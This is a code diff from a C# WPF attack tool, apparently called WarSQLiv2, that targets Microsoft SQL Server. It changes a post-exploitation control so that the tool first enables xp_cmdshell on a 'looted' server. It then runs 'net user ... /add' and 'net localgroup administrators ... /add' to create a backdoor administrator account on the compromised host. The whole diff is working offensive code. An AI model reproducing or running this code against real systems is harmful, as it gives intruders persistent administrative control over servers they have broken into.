@@ -69,53 +69,85 @@ namespace WarSQLiv2.UserControls.Attack.MSSQL
         }
         private void btnSave_Click(object sender, RoutedEventArgs e)
         {
-            try
+            var isActivated = cmdControl.isActivated;
+            var isExecuted = cmdControl.isExecuted;
+            if (isActivated == false && isExecuted == false)
             {
-                Dispatcher.Invoke((Action)delegate
+                var enableXpCmdShell = new EnableXpCmdShell { LootedServer = lstLooted.SelectedItem.ToString() };
+                try
                 {
-                    _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
-                    _postExploitation.SqlCommand = "net user " + txtUserName.Text + " " + txtPassword.Text + " /add";
-                    _postExploitation.VolumeList = new List<string>();
-                    _postExploitation.VolumeList.Clear();
-                    _postExploitation.SqlExploitation();
-                    txtStatus.AppendText(_postExploitation.ExploitResult);
-                    for (var i = 0; i < _postExploitation.VolumeList.Count; i++)
+                    Dispatcher.Invoke((Action)delegate
                     {
-                        txtStatus.AppendText(_postExploitation.VolumeList[i].Replace(" ", "").Replace("                       ", "").Replace("                                                                                                             ", "").Replace("  ", ""));
-                    }
-                });
-            }
-            catch (Exception exp)
-            {
-                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                        enableXpCmdShell.XpCmdShellStatus();
+                        txtStatus.AppendText(enableXpCmdShell.Result);
+                        var cmdLandResult = _languageControl.SelectedLanguage.GetString("XPCmdShell2");
+                        var contains = enableXpCmdShell.Result.Contains(cmdLandResult);
+                        if (contains == true)
+                        {
+                            isActivated = true;
+                            isExecuted = true;
+                        }
+                    });
+                }
+                catch (Exception)
                 {
-                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
-                });
-            }
-            try
-            {
-                Dispatcher.Invoke((Action)delegate
-                {
-                    _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
-                    _postExploitation.SqlCommand = string.Empty;
-                    _postExploitation.SqlCommand += "net localgroup administrators " + txtUserName.Text + " /add";
-                    _postExploitation.VolumeList = new List<string>();
-                    _postExploitation.VolumeList.Clear();
-                    _postExploitation.SqlExploitation();
-                    txtStatus.AppendText(_postExploitation.ExploitResult);
-                    for (var i = 0; i < _postExploitation.VolumeList.Count; i++)
+                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                     {
-                        txtStatus.AppendText(_postExploitation.VolumeList[i].Replace("\r", "").Replace("\n", ""));
-                    }
-                });
+                        txtStatus.AppendText(enableXpCmdShell.CmdException);
+                    });
+                }
             }
-            catch (Exception exp)
+            if (isExecuted == true && isActivated == true)
             {
-                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                try
                 {
-                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
-                });
+                    Dispatcher.Invoke((Action)delegate
+                    {
+                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
+                        _postExploitation.SqlCommand = "net user " + txtUserName.Text + " " + txtPassword.Text + " /add";
+                        _postExploitation.VolumeList = new List<string>();
+                        _postExploitation.VolumeList.Clear();
+                        _postExploitation.SqlExploitation();
+                        txtStatus.AppendText(_postExploitation.ExploitResult);
+                        for (var i = 0; i < _postExploitation.VolumeList.Count; i++)
+                        {
+                            txtStatus.AppendText(_postExploitation.VolumeList[i].Replace(" ", "").Replace("                       ", "").Replace("                                                                                                             ", "").Replace("  ", ""));
+                        }
+                    });
+                }
+                catch (Exception exp)
+                {
+                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                    {
+                        txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
+                    });
+                }
+                try
+                {
+                    Dispatcher.Invoke((Action)delegate
+                    {
+                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
+                        _postExploitation.SqlCommand = string.Empty;
+                        _postExploitation.SqlCommand += "net localgroup administrators " + txtUserName.Text + " /add";
+                        _postExploitation.VolumeList = new List<string>();
+                        _postExploitation.VolumeList.Clear();
+                        _postExploitation.SqlExploitation();
+                        txtStatus.AppendText(_postExploitation.ExploitResult);
+                        for (var i = 0; i < _postExploitation.VolumeList.Count; i++)
+                        {
+                            txtStatus.AppendText(_postExploitation.VolumeList[i].Replace("\r", "").Replace("\n", ""));
+                        }
+                    });
+                }
+                catch (Exception exp)
+                {
+                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                    {
+                        txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
+                    });
+                }
             }
+            
         }
         private void lstLooted_SelectionChanged(object sender, SelectionChangedEventArgs e)
         {
